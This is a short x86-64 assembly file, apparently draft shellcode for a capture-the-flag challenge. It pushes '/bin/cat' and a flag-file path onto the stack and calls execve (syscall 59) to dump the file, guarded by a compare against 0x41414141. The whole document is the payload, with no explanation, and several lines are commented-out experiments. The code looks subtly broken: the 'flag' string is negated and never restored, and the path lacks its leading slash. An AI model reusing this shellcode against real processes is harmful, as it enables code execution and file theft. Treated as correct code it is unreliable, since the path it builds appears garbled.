
section .text
    global _start

_start:
    mov rbx, rax
    ;call RET
;filename:	db 'flag', 0x00
;RET:
	xor rdx,rdx
	;push rdx
	;mov rax, -444016125487
	mov rax, 'flag'
	neg rax
	push rax
    mov rax, 'home/ctf'
    ;neg rax
    ;mov rax, 'flag'
	push rax
    mov rax, rsp
	;pop rax
	push rdx
	mov rcx, '/bin/cat'
	push rcx
	mov rdi, rsp
	push rdx
	push rax
	push rdi
	xor rax, rax
	mov rsi, rsp
    xor al, al
	add al, 59
    cmp     rbx, 0x41414141
    jbe end
	syscall
	
end:
    mov    rdx, 0x12345678
	
